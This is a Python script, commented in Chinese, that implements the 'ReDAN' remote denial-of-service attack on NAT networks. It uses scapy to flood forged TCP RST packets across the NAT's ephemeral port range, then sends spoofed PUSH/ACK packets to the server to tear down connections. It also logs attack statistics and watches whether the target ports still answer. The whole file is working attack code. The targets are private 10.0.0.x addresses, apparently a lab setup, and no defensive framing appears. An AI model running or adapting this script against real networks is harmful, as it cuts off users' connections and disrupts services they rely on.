#!/usr/bin/env python3
"""
ReDAN攻击实现
远程DoS攻击针对NAT网络
"""

import socket
import scapy.all as scapy
import time
import threading
import random
import json
from scapy.layers.inet import IP, TCP, ICMP
from concurrent.futures import ThreadPoolExecutor

class ReDANAttack:
    def __init__(self, nat_ip, server_ip, target_ports_range=(32768, 61000)):
        self.nat_ip = nat_ip
        self.server_ip = server_ip
        self.target_ports_range = target_ports_range
        self.attack_running = False
        self.attack_stats = {
            'rst_packets_sent': 0,
            'push_ack_packets_sent': 0,
            'start_time': None,
            'end_time': None,
            'success_rate': 0
        }
        
    def craft_rst_packet(self, target_port, seq_num=0):
        """创建TCP RST包"""
        rst_packet = IP(dst=self.nat_ip)/TCP(
            sport=80,  # 假设目标服务器端口是80
            dport=target_port,
            flags='R',
            seq=seq_num
        )
        return rst_packet
    
    def craft_push_ack_packet(self, target_port, seq_num=0):
        """创建TCP PUSH/ACK包"""
        push_ack_packet = IP(dst=self.server_ip)/TCP(
            sport=target_port,
            dport=80,
            flags='PA',
            seq=seq_num,
            ack=0
        )/scapy.Raw(load=b"FAKE DATA FOR ATTACK")
        return push_ack_packet
    
    def craft_syn_ack_packet(self, target_port, seq_num=0):
        """创建TCP SYN/ACK包"""
        syn_ack_packet = IP(dst=self.server_ip)/TCP(
            sport=target_port,
            dport=80,
            flags='SA',
            seq=seq_num,
            ack=0
        )
        return syn_ack_packet
    
    def stage1_remove_mappings(self, num_packets=1000, batch_size=100):
        """第一阶段：移除NAT映射"""
        print("[Stage 1] 开始移除NAT映射...")
        
        packets_sent = 0
        total_ports = self.target_ports_range[1] - self.target_ports_range[0]
        
        # 分批发送RST包
        for batch_start in range(self.target_ports_range[0], self.target_ports_range[1], batch_size):
            if packets_sent >= num_packets:
                break
                
            batch_end = min(batch_start + batch_size, self.target_ports_range[1])
            
            # 并行发送一批RST包
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                
                for port in range(batch_start, batch_end):
                    if packets_sent >= num_packets:
                        break
                        
                    seq_num = random.randint(0, 4294967295)
                    rst_packet = self.craft_rst_packet(port, seq_num)
                    
                    future = executor.submit(scapy.send, rst_packet, verbose=False)
                    futures.append(future)
                    packets_sent += 1
                
                # 等待这批包发送完成
                for future in futures:
                    future.result()
            
            # 短暂延迟避免网络拥塞
            time.sleep(0.1)
            
            if packets_sent % 100 == 0:
                print(f"    已发送 {packets_sent} 个RST包")
        
        self.attack_stats['rst_packets_sent'] = packets_sent
        print(f"[Stage 1] 完成，共发送 {packets_sent} 个RST包")
        return packets_sent
    
    def stage2_manipulate_tcp(self, num_packets=1000, batch_size=100):
        """第二阶段：操控TCP状态"""
        print("[Stage 2] 开始操控TCP状态...")
        
        packets_sent = 0
        
        # 分批发送PUSH/ACK包
        for batch_start in range(self.target_ports_range[0], self.target_ports_range[1], batch_size):
            if packets_sent >= num_packets:
                break
                
            batch_end = min(batch_start + batch_size, self.target_ports_range[1])
            
            # 并行发送一批PUSH/ACK包
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                
                for port in range(batch_start, batch_end):
                    if packets_sent >= num_packets:
                        break
                        
                    seq_num = random.randint(0, 4294967295)
                    push_ack_packet = self.craft_push_ack_packet(port, seq_num)
                    
                    future = executor.submit(scapy.send, push_ack_packet, verbose=False)
                    futures.append(future)
                    packets_sent += 1
                
                # 等待这批包发送完成
                for future in futures:
                    future.result()
            
            # 短暂延迟
            time.sleep(0.1)
            
            if packets_sent % 100 == 0:
                print(f"    已发送 {packets_sent} 个PUSH/ACK包")
        
        self.attack_stats['push_ack_packets_sent'] = packets_sent
        print(f"[Stage 2] 完成，共发送 {packets_sent} 个PUSH/ACK包")
        return packets_sent
    
    def stage3_terminate_connections(self, duration=10):
        """第三阶段：终止连接"""
        print("[Stage 3] 等待服务器响应并终止连接...")
        
        # 这个阶段主要是由服务器自动完成
        # 我们在这里监控攻击效果
        start_time = time.time()
        
        while time.time() - start_time < duration:
            print(f"    攻击进行中... {time.time() - start_time:.1f}s")
            time.sleep(1)
        
        print("[Stage 3] 连接终止完成")
    
    def run_attack(self, iterations=3, delay=2, rst_packets=500, push_ack_packets=500):
        """运行完整的ReDAN攻击"""
        print(f"[*] 开始ReDAN攻击，目标: {self.nat_ip}")
        print(f"[*] 目标端口范围: {self.target_ports_range[0]}-{self.target_ports_range[1]}")
        print(f"[*] 服务器IP: {self.server_ip}")
        
        self.attack_running = True
        self.attack_stats['start_time'] = time.time()
        
        for i in range(iterations):
            if not self.attack_running:
                break
                
            print(f"\n[*] 攻击迭代 {i+1}/{iterations}")
            
            # 执行三个阶段
            rst_count = self.stage1_remove_mappings(rst_packets)
            time.sleep(delay)
            
            push_ack_count = self.stage2_manipulate_tcp(push_ack_packets)
            time.sleep(delay)
            
            self.stage3_terminate_connections(5)
            
            print(f"[+] 迭代 {i+1} 完成")
            
        self.attack_stats['end_time'] = time.time()
        print("\n[+] ReDAN攻击完成")
        
        # 保存攻击统计
        self.save_attack_stats()
    
    def save_attack_stats(self):
        """保存攻击统计信息"""
        attack_duration = self.attack_stats['end_time'] - self.attack_stats['start_time']
        
        stats = {
            'attack_info': {
                'nat_ip': self.nat_ip,
                'server_ip': self.server_ip,
                'target_ports_range': self.target_ports_range,
                'start_time': self.attack_stats['start_time'],
                'end_time': self.attack_stats['end_time'],
                'duration': attack_duration
            },
            'packets': {
                'rst_packets_sent': self.attack_stats['rst_packets_sent'],
                'push_ack_packets_sent': self.attack_stats['push_ack_packets_sent'],
                'total_packets': self.attack_stats['rst_packets_sent'] + self.attack_stats['push_ack_packets_sent']
            },
            'bandwidth': {
                'rst_bandwidth_mbps': (self.attack_stats['rst_packets_sent'] * 64 * 8) / (attack_duration * 1024 * 1024),
                'push_ack_bandwidth_mbps': (self.attack_stats['push_ack_packets_sent'] * 128 * 8) / (attack_duration * 1024 * 1024)
            }
        }
        
        with open('/output/attack_statistics.json', 'w') as f:
            json.dump(stats, f, indent=2)
        
        print("[*] 攻击统计已保存到 /output/attack_statistics.json")
    
    def stop_attack(self):
        """停止攻击"""
        self.attack_running = False
        print("[*] 攻击已停止")

def monitor_connections(target_ip, ports=[22, 80, 21], interval=5):
    """监控连接状态"""
    print(f"[*] 监控 {target_ip} 的连接状态...")
    
    connection_log = []
    
    while True:
        timestamp = time.time()
        
        for port in ports:
            # 尝试连接目标端口
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target_ip, port))
                
                status = "正常" if result == 0 else "失败"
                sock.close()
                
                log_entry = {
                    'timestamp': timestamp,
                    'target': f"{target_ip}:{port}",
                    'status': status,
                    'port': port
                }
                connection_log.append(log_entry)
                
                print(f"[{time.strftime('%H:%M:%S')}] {target_ip}:{port} - {status}")
                
            except Exception as e:
                log_entry = {
                    'timestamp': timestamp,
                    'target': f"{target_ip}:{port}",
                    'status': f"错误: {e}",
                    'port': port
                }
                connection_log.append(log_entry)
                print(f"[{time.strftime('%H:%M:%S')}] {target_ip}:{port} - 错误: {e}")
        
        # 保存连接日志
        with open('/output/connection_monitor.json', 'w') as f:
            json.dump(connection_log, f, indent=2)
        
        time.sleep(interval)

def main():
    # 配置参数
    nat_ip = "10.0.0.2"        # NAT设备的外部IP
    server_ip = "10.0.0.10"    # 服务器IP
    
    # 创建攻击实例
    attacker = ReDANAttack(nat_ip, server_ip)
    
    # 启动监控线程
    monitor_thread = threading.Thread(target=monitor_connections, args=(server_ip,))
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # 运行攻击
    try:
        attacker.run_attack(iterations=2, delay=3, rst_packets=300, push_ack_packets=300)
    except KeyboardInterrupt:
        print("\n[!] 用户中断攻击")
        attacker.stop_attack()

if __name__ == "__main__":
    main()